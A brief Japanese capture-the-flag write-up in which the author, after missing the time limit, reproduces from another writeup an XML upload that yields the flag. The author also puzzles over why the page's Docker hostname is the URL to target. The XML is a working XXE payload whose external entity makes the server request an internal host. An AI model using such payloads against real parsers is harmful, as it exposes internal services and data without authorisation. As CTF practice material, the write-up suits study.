...
時間内に解けなかった。writeupを参考に以下のxmlをアップロードしたらflag。
トップページにDocker Hostnameと書かれてるヤツがURLになってるんだろうが、  
なぜ「このURLでやってみよう」となるのか、不思議

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY pass SYSTEM "http://traffic-light-1004">
]>
<root>
  <content>&pass;</content>
</root>
